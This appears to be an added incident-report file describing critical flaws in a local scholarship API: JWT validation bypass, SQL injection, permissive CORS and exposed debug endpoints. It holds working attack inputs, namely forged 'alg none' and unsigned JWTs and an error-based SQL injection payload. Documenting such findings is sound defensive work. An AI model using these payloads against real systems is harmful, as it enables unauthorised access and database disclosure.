@@ -1,0 +1,129 @@
+{
+  "incident_id": "SEV1-20250821-JWT-SQLI",
+  "timestamp": "2025-08-21T16:37:00Z",
+  "severity": "SEV-1",
+  "status": "ACTIVE",
+  "affected_endpoints": [
+    "/api/v1/scholarships",
+    "/api/v1/search",
+    "/api/v1/eligibility/check",
+    "/api/v1/recommendations"
+  ],
+  "critical_vulnerabilities": {
+    "jwt_validation_bypass": {
+      "severity": "CRITICAL",
+      "description": "Complete JWT validation bypass - all malformed tokens accepted",
+      "proof_of_concepts": [
+        {
+          "attack_type": "alg_none_bypass",
+          "method": "GET",
+          "url": "http://localhost:5000/api/v1/scholarships",
+          "headers": {
+            "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTYzMDAwMDAwMH0."
+          },
+          "expected_response": "HTTP 401 Unauthorized",
+          "observed_response": "HTTP 200 OK",
+          "reproduction_verified": true
+        },
+        {
+          "attack_type": "empty_signature",
+          "method": "GET", 
+          "url": "http://localhost:5000/api/v1/scholarships",
+          "headers": {
+            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTYzMDAwMDAwMH0."
+          },
+          "expected_response": "HTTP 401 Unauthorized",
+          "observed_response": "HTTP 200 OK",
+          "reproduction_verified": true
+        },
+        {
+          "attack_type": "malformed_token",
+          "method": "GET",
+          "url": "http://localhost:5000/api/v1/search", 
+          "headers": {
+            "Authorization": "Bearer invalid.token.here"
+          },
+          "expected_response": "HTTP 401 Unauthorized",
+          "observed_response": "HTTP 200 OK",
+          "reproduction_verified": true
+        }
+      ],
+      "root_cause": "PUBLIC_READ_ENDPOINTS feature flag bypasses all JWT validation",
+      "affected_code_paths": [
+        "routers/scholarships.py:43",
+        "middleware/auth.py:get_current_user dependency"
+      ]
+    },
+    "sql_injection": {
+      "severity": "CRITICAL", 
+      "description": "SQL injection vulnerability in eligibility check endpoint",
+      "proof_of_concept": {
+        "method": "GET",
+        "url": "http://localhost:5000/api/v1/eligibility/check",
+        "params": {
+          "field_of_study": "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        "expected_response": "HTTP 400 Bad Request or sanitized error",
+        "observed_response": "HTTP response contains SQL error: 'table'",
+        "reproduction_verified": true
+      },
+      "affected_tables": [
+        "scholarships",
+        "information_schema.tables (exposed)"
+      ],
+      "exploitation_evidence": "Database structure information leaked in error responses"
+    },
+    "cors_bypass": {
+      "severity": "HIGH",
+      "description": "CORS policy allows malicious origins",
+      "proof_of_concept": {
+        "method": "OPTIONS",
+        "url": "http://localhost:5000/api/v1/scholarships",
+        "headers": {
+          "Origin": "http://localhost:3000",
+          "Access-Control-Request-Method": "GET",
+          "Access-Control-Request-Headers": "authorization"
+        },
+        "expected_response": "HTTP 400 Bad Request or origin rejection",
+        "observed_response": "Access-Control-Allow-Origin: http://localhost:3000",
+        "reproduction_verified": true
+      }
+    },
+    "sensitive_data_exposure": {
+      "severity": "HIGH",
+      "description": "Debug endpoints expose sensitive configuration",
+      "endpoints_affected": [
+        "/.env",
+        "/config", 
+        "/debug"
+      ],
+      "exposed_information": [
+        "environment configuration",
+        "debug information",
+        "system configuration details"
+      ]
+    }
+  },
+  "current_deployment": {
+    "environment": "development",
+    "branch": "main",
+    "image_tag": "latest",
+    "feature_flags": {
+      "PUBLIC_READ_ENDPOINTS": "enabled",
+      "JWT_VALIDATION": "bypassed"
+    }
+  },
+  "immediate_containment_status": {
+    "gateway_block": "NOT_IMPLEMENTED",
+    "cors_lockdown": "NOT_IMPLEMENTED", 
+    "waf_rules": "NOT_IMPLEMENTED",
+    "key_rotation": "NOT_IMPLEMENTED",
+    "access_restriction": "NOT_IMPLEMENTED"
+  },
+  "code_artifacts": {
+    "auth_middleware": "middleware/auth.py",
+    "jwt_validation": "Lines 125-170",
+    "openapi_auth_guards": "/docs endpoint shows authentication requirements",
+    "vulnerable_endpoints": "routers/scholarships.py"
+  }
+}
